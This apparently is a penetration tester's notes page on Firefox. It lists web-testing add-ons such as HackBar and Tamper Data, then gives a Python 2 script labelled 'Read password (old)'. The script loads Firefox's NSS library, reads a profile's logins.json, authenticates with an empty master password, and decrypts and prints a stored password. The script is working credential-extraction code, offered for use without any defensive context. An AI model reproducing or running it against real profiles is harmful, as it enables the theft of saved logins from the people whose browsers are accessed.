Firefox
=======


## Useful addons

Here are good Firefox addons to install:

- [Firefox Multi-Account Containers](https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/)
- [FoxyProxy Standard](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
- [Wappalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/)
- [HackBar](https://addons.mozilla.org/fr/firefox/addon/hackbartool/)
- [User-Agent Switcher and Manager](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/)
- [Tamper Data for FF Quantum](https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum)


## Read password (old)
```python
import os
from ctypes import Structure, CDLL
from ctypes import c_uint, c_void_p, c_char_p, cast, byref, string_at, c_ubyte
import json
import base64

NSSNAME = 'nss3.dll'
FIREFOX_PATH = r'C:\Program Files\Mozilla Firefox'
os.environ['PATH'] = ";".join([os.environ['PATH'], FIREFOX_PATH])

class SECItem(Structure):
    _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)]

class secuPWData(Structure):
    _fields_ = [('source', c_ubyte), ('data', c_char_p)]

def get_nss_lib():
    nsslib = os.path.join(FIREFOX_PATH, NSSNAME)

    return CDLL(nsslib)

def open_logins_file(folder):
    with open(os.path.join(folder, 'logins.json')) as fd:
        d = fd.read()
        j = json.loads(d)

    return j

def read_password(folder):
    data = open_logins_file(folder)
    nsslib = get_nss_lib()
    logins = data.get('logins', [])

    ret_init = nsslib.NSS_Init(folder)
    print "[+] Init NSS: %s" % ret_init


    keySlot = nsslib.PK11_GetInternalKeySlot()
    nsslib.PK11_CheckUserPassword(keySlot, '')
    nsslib.PK11_Authenticate(keySlot, True, 0)

    field = SECItem()
    dectext = SECItem()

    pwdata = secuPWData()
    pwdata.source = 0 #PW_NONE
    pwdata.data = 0

    d = logins[0]['encryptedPassword']
    print d
    field.data = cast(c_char_p(base64.b64decode(d)), c_void_p)
    field.len = len(base64.b64decode(d))

    print nsslib.PK11SDR_Decrypt(byref(field), byref(dectext), byref(pwdata))
    print string_at(dectext.data, dectext.len)

    nsslib.NSS_Shutdown()

if __name__ == '__main__':
    d = r'C:\Users\xxx\AppData\Roaming\Mozilla\Firefox\Profiles\xxx'
    read_password(d)

```